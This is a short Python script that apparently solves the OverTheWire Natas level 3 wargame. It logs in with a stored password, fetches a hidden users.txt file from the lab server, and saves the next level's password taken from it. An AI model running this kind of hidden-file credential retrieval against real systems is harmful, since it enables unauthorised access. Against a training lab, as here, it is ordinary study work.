import requests

url="http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"
username="natas3"
file=open('password.txt', 'r')
password=file.read()

response = requests.get(url, auth=(username, password))

str="natas4"
print(response.text.split(":")[1])
with open('password.txt', 'w') as f:
    f.write(response.text.split(":")[1])
file.close()